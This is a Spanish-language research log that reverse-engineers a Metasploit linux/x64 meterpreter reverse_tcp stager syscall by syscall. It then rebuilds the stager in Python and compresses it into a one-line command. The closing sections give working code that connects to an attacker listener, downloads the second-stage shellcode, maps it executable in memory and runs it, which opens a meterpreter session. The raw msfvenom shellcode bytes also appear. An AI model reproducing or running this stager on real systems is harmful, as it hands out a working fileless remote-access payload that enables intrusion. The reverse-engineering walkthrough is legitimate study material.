# levantando un meterpreter reverso con un comando

este research quedo plasmado en [esta presentacion](https://docs.google.com/presentation/d/e/2PACX-1vQ-3Uiytk6UqMZ2_Ntedhg47RXRxgpF48u8ECbrQ1Hqay4fC3j7es8xqzW5moZbaztnMEBIDKxoSvV0/pub?start=false&loop=false&delayms=3000), este draft es la vitacora del dia a dia mientras arme todo

## Pasos que hice para recreala

queremos duplicar el comportamiento de la siguiente shellcode en un lenguaje de alto nivel como python

```
➜  ~ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.20.74 LPORT=4444 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 130 bytes
Final size of c file: 571 bytes
unsigned char buf[] =
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x11\x5c\xc0\xa8"
"\x14\x4a\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";
```

pero para analizar eso se pone medio cuesta arriba, lo que vamos a hacer es pasarlo a un binario y levantarlo con ghidra para reversear que hace

```
➜  ~ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.20.74 LPORT=4444 -f elf > reverse.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes

```

y abrimos ese binario con ghidra, verificando que el entry point ya tiene los mismos bytes que tenia la shellcode en la version de c

![](docs/img/1.png)

para entender esta shellcode (o cualquier otra de linux) solo tenemos que saber como es la calling convention para syscalls en x64

la documentacion dice esto:

1 User-level applications use as integer registers for passing the sequence %rdi, %rsi, %rdx, %rcx, %r8 and %r9. The kernel interface uses %rdi, %rsi, %rdx, %r10, %r8 and %r9.
2 A system-call is done via the syscall instruction. The kernel destroys registers %rcx and %r11.
3 The number of the syscall has to be passed in register %rax.
4 System-calls are limited to six arguments,no argument is passed directly on the stack.
5 Returning from the syscall, register %rax contains the result of the system-call. A value in the range between -4095 and -1 indicates an error, it is -errno.
6 Only values of class INTEGER or class MEMORY are passed to the kernel.

pasando en limpio, se pasa el numerito de la syscall por %rax y los argumentos por %rdi, %rsi, %rdx, %r10, %r8 y %r9

retornando el valor por %rax

a %rax se le pasa un numerito, que ese numero lo sacamos del kernel source, concretamente del archivo *linux-headers-5.0.0-37-generic/arch/x86/include/generated/uapi/asm/unistd\_64.h*

la mejor forma, es dividir las partes de syscall en syscall, por eso vamos a agarrar hasta la primer llamada:

![](docs/img/9.png)

al llegar a la syscall tenemos los registros asi:

* %rax = 9:
```
PUSH    0x9
POP     RAX
```
* %rdi = NULL
```
XOR     RDI, RDI
```
* %rsi = 0x1000
```
CDQ
MOV     DH,0x10
MOV     RSI,RDX
```
CDQ debe usarse para poner a 0x00 RDX, despues le mueve un 0x10 a DH que es la parte alta de EDX, entonces en RDX queda un 0x1000 y eso se pasa a RSI
* %rdx = 0x1007
```
MOV DL,0x7
```
solo puse esa instruccion, pero ya venia cargado con el 0x1000 de cuando seteo %rsi, asi que quedo 0x1007
* %r10 = 0x22
```
PUSH    0x22
POP     R10
```
* %r8 <-- uninitialized
* %r9 = NULL
```
XOR     R9,R9
```

de la lista de syscalls, sacamos que 0x9 es \_\_NR\_mmap

y por la man page, sabemos como llamar a mmap:

![](docs/img/6.png)

ademas de verlo muerto, vamos a correrlo con gdb y frenar en cada syscall para chequear de que vamos bien:

![](docs/img/4.png)

ponemos un breakpoint en la instruccion syscall y corremos hasta ahi para ver como tiene los argumentos:

![](docs/img/5.png)

la llamada entonces es un:

```c
mmap(0x00, 0x1000, 0x1007, 0x22, 0x00, 0x00);
```

el 0x1007 en el argumento prot, no presta atencion al 0x1000, que solo se uso para setear el anterior

y buscando los defines, lo podriamos escribir como:

```c
mmap(NULL, 0x1000, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_COPY|MAP_ANONYMOUS, 0x00, 0x00);
```

como le pasa MAP\_ANONYMOUS no le da bola al argumento fd e inicializa todo con 0x00

![](docs/img/7.png)

*solo pidio 0x1000 bytes con permisos rwx*

por ultimo chequea si la llamada retorno algo menor a 0, en cuyo caso fallo y se va a este bloque

![](docs/img/8.png)

0x3c es 60, y esa syscall corresponde a:

![](docs/img/9.png)

con el argumento 1, es un:

```c
exit(1);
```

## Segundo syscall

![](docs/img/10.png)

* %r9 = 0xa
* salva la direccion del buffer allocado en stack
* %rax = 0x29
* %rdi = 0x2
* %rdx = 0x00
* %rsi = 0x1

0x29 es 41, y corresponde a la syscall socket:

![](docs/img/11.png)

la manpage:

![](docs/img/12.png)

los argumentos son faciles, veamos que onda:
* %rdi es 0x2 que en una llamada normal vendria de un SOCK\_AF\_INET, y ese seria nuestro "domain"
* %rsi es 0x1 que es un SOCK\_STREAM.
* %rdx = NULL

en limpio:
```c
int fd = socket(AF_INET, SOCK_STREAM, NULL);
```

si devuelve error (menor a 0) se va por el exit tambien

## tercer syscall

![](docs/img/13.png)

pasa el socket descriptor que retorno la sycall socket como primer argumento de otra funcion (al RDI)

0x2a es la syscall que si miramos la foto por ahi arriba es un \_\_NR\_connect

![](docs/img/14.png)

ahi dice sockaddr, pero en los ejemplos (y en la shellcode) usa una sockaddr\_in

la parte mas complicada parece la de generar el puntero a la estructura sockaddr\_in:

![](docs/img/15.png)

la estructura tiene esta pinta:

![](docs/img/16.png)

sa\_family\_t es unsigned int, asi que el chorizo ese que mete a la fuerza como 0x4a14a8c05c110002 si lo organizamos, seria esto:

0x4a14a8c0 el ip como big endian

![](docs/img/17.png)

despues le sigue el puerto en big endian tambien:

![](docs/img/18.png)

y el 0002 debe ser de AF\_INET

por ultimo RDX recibe el sizeof de la estructura que es 0x10

```c
connect(fd, sockaddr_in *pepe, sizeof(sockaddr_in));
```

# cuarto syscall

![](docs/img/19.png)

popea a RCX lo que habia en el stack, esto debe ser para salvar alguna parte de la estructura sockaddr\_in

verifica que no haya retornado error, en cuyo caso se va al exit de siempre y despues llama a la funcion \_\_NR\_nanosleep:

nanosleep tiene la siguiente forma:

![](docs/img/20.png)

la estructura timespec:

```c
struct timespec {
    time_t  tv_sec;
    long    tv_nsec;
}
```

time\_t es long int, los campos son los numeros de segundos y nanosegundos a frenar, respectivamente.

nanosleep es como el sleep de siempre, pero da una solucion por si cae una signal que hay que procesar en medio del delay

es por eso que el segundo es un puntero donde se escribe la cantidad de tiempo que freno hasta que recibio una senal, si sale bien, este es NULL

rem puede ser NULL tambien, y asi lo usa aca

hace la estructura y lo pasa como argumento desde el stack

solo espera 5 segundos.

los pop que siguen son para limpiar la estructura y verifica que no haya dado error (un -1 con el cual se va al exit)

aca parece que hay un bucle, esperando 5 segundos y retratando si el connect da error... por eso esta en 4000c6 chequeando JNS, sale del bucle si retorna mayor a 0, que seria el handle

y cae en el syscall siguiente, ya sabiendo que tiene abierta la conexion

## 5to syscall

el ultimo syscall es este:

![](docs/img/21.png)

no encontre la seteada a RAX, pero me la juego a que tiene que ser una especie de recv para llenar el buffer a donde apunta RSI y despues salta a ejecutar

correccion, la seteada a RAX no la veia porque en algun lado la setea en NULL (posiblemente el retorno del connect) y despues no la toca para usar la syscall read:

![](docs/img/30.png)

#EN LIMPIO ES UN STAGER

para comprobarlo vamos a conectarnos al multi handler, primero entramos a metasploit y lo seteamos asi:

![](docs/img/22.png)

corremos con exploit y queda a la espera de una conexion

![](docs/img/23.png)

nos conectamos con netcat para ver que fruta tira:

```console
nc 192.168.20.56 4444 | hexdump -C | more
```

la salida es la siguiente:

![](docs/img/24.png)

parece ser que es shellcode y un file (posiblemente un .so para hacer una tecnica similar a la carga de dlls en runtime) mirando por ahi podemos ver el ELF de la cabecera del binario:

![](docs/img/26.png)

mientras msfconsole nos avisa que el stager 1 hizo su trabajo:

![](docs/img/25.png)

copy/pasting de los opcodes en el x64dbg para que nos muestre desemsablado:

![](docs/img/27.png)

solo snipetie los dos syscalls, el primero es un mmap y el otro me aparece como un recvfrom pero seguramente esta mal

ya en este punto, no nos importa mucho como funciona el segundo stager que carga el .so en memoria, entonces vamos a hacer de cuenta que no paso nada y solo replicar el primer stage con python

# replicando stage 1 en python

esto es lo unico que necesitamos, lo otro lo ejecuta el multi handler haciendo las magias pertinentes

## ejecutar shellcode en python (linux version)

agarre este binario que ejecuta la shellcode como tiro, asi que lo voy a analizar porque lo corrio con ctypes:

![](docs/img/28.png)

el codigo que hace la magia queda reducido a esto:
![](docs/img/29.png)

# encontrando la cantidad de bytes que solicita el stage 1

es necesario saber cuantos bytes trae el stager para duplicarlo en python. Primero veamos los argumentos del read:

![](docs/img/31.png)

Para eso puse un catchpoint en read y mire los registros:

![](docs/img/32.png)

0x7e el size de bytes que trae, que oooo casualidad es el tamanio de nuestro second stage:

![](docs/img/33.png)

cuando haga la documentacion oficial voy a necesitar la direccion de la instruccion que ejecuto esto, asi que lo pego por aca para no andar mirando codigo muerto luego:

![](docs/img/34.png)

era el ultimo syscall nomas, antes del jump como habiamos dicho mirandolo muerto

# analizando en caliente el stage 2

![](docs/img/35.png)

traceamos hasta las syscalls usando "ni" y nos paramos en las instrucciones syscall:

* primera:

![](docs/img/36.png)

un mmap como tambien dijimos:

![](docs/img/37.png)

los argumentos son:

![](docs/img/38.png)

y fueron llamados con:

![](docs/img/39.png)

el size que "alloco" para alojar el file es de 3021284 que ooo casualidad es el size que nos dice en la ventanita:

![](docs/img/40.png)

esto nos devuelve una zona del size que tiene el .so con puros ceros:

![](docs/img/41.png)

traceamos hasta el otro syscall que esta en 0x7ffff7ffa043 y inspeccionamos los registros para sacar que funcion es:

![](docs/img/42.png)

y mirando el unistd.h sacamos que es un recvfrom:

![](docs/img/43.png)

argumentos:

![](docs/img/44.png)

llamados con:

![](docs/img/45.png)

las sockaddr son null, el length es el del file .so y el buffer es el allocado con mmap, entonces despues de esto va a estar colocado en memoria nuestro .so:

![](docs/img/46.png)

metanle imaginacion y vean el ELF en esa imagen

solo quedan 20 instrucciones que hacen la magia para ejecutar el .so desde memoria, veamoslas:

![](docs/img/47.png)

asi a vuelo de pajaro:
* alinea el stack
* alloca espacio
* pushea un par de valores
* le suma un offset al puntero base para saltar al "entry point" del modulo
* ejecuta el entry point

## primer intento de stage 1 enteramente en python

![](docs/img/48.png)

me tiro Segmentation Fault crudamente, y cuando tracie con gdb vi que la zona que va a ejecutar en el ultimo jmp %rsi esta totalmente vacia:

![](docs/img/49.png)

eso es porque el stage 2 tiene que recibir el handle del socket que abre el stage 1 para que lo use recvfrom... se ve que hay que setear algun registro entre el stage 1 y el 2 del cual levanta el file descriptor a usar

tiene toda la pinta de que el descriptor lo pasa por el registro rdi:

![](docs/img/50.png)

hacemos la modificacion al python para finalmente dejarlo asi:

```python
#!/usr/bin/env python

import ctypes
import ctypes.util
import socket
import struct
import sys

def run_code_linux(shellcode):
    """Run the specified shellcode on Linux"""
    # Find functions in libc
    libc = ctypes.CDLL(ctypes.util.find_library('c'))
    libc.mmap.restype = ctypes.c_void_p
    libc.mprotect.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int]

    # Allocate memory with a RW private anonymous mmap
    # PROT_READ=1, PROT_WRITE=2, PROT_EXEC=4
    mem = libc.mmap(0, len(shellcode), 3, 0x22, -1, 0)
    if int(mem) & 0xffffffff == 0xffffffff:
        libc.perror(b"mmap")
        return 1

    # Copy the shellcode
    ctypes.memmove(mem, shellcode, len(shellcode))

    # Change protection to RX
    if libc.mprotect(mem, len(shellcode), 5) == -1:
        libc.perror(b"mprotect")
        return 1

    # Run!
    return ctypes.CFUNCTYPE(ctypes.c_int)(mem)()


if __name__ == '__main__':
    if sys.version_info < (2, 7):
        sys.stderr.write("This program cannot be run in Python<2.7 mode.\n")
        sys.exit(0)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.20.56", 4444))
    shellcode_2nd_stage = s.recv(126)
    run_code_linux("\xbf" + struct.pack("<L", s.fileno()) + shellcode_2nd_stage)
```

donde lo corremos vemos que queda bloqueado el python y la meterpreter se activa:

![](docs/img/51.png)

# ultimo paso, haciendolo one liner

```console
➜  ~ python3 -c 'import socket,struct,ctypes,ctypes.util;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(("192.168.20.56",4444));sc=b"\xbf"+struct.pack("<L",s.fileno())+s.recv(126);l=ctypes.CDLL(ctypes.util.find_library("c"));l.mmap.restype=ctypes.c_void_p;l.mprotect.argtypes=[ctypes.c_void_p,ctypes.c_int,ctypes.c_int];m=l.mmap(0,len(sc),3,0x22,-1,0);ctypes.memmove(m,sc,len(sc));l.mprotect(m,len(sc),5);ctypes.CFUNCTYPE(ctypes.c_int)(m)()'
```

le saque los chequeos de version y de errores, y tambien todas las funciones superfluas

# Notas finales

este stager tambien funciona con el handler de la reverse shell normal, y ajustando el tamano del recv puede funcionar con la vncinject (siempre y cuando el windows tenga python instalado)

# en caso de falla

si falla puede ser:
* que el tamanio del stage 1 sea diferente a 126.

